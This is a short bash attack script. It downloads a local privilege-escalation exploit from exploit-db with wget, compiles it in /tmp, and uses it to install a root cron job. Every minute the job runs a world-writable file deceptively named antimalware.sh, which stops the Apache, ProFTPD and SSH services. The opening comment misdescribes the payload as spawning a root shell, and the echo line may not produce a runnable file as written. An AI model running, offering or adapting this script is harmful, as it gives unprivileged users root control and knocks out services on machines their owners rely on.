#!/bin/bash
# Can be run by any unprivileged user to spawn a root shell.
# Unlike dirtycow, this one does NOT crash the machine
echo 'service apache2 stop\nservice proftpd stop\nservice sshd stop' > /tmp/antimalware.sh
chmod 777 /tmp/antimalware.sh
wget http://www.exploit-db.com/download/37292 -O /tmp/ofs.c
gcc /tmp/ofs.c -o /tmp/ofs
echo 'echo "*/1 * * * * /tmp/antimalware.sh" | sudo crontab - && exit' | /tmp/ofs